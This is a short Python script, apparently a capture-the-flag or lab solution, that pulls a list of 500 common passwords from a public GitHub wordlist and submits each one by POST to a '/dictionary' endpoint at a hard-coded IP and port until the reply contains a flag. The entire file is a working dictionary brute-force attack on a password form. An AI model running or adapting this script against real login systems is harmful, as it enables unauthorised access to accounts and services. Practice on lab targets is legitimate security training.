import requests

url="94.237.59.119"
port="48459"

passwords = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt').text.splitlines()

for password in passwords:
	print(f"Attempted Password : {password}")

	response = requests.post(f"http://{url}:{port}/dictionary", data={'password': password})
	
	if response.ok and 'flag' in response.json():
		print(f"\nCorrect Password\n", response.json())
		break


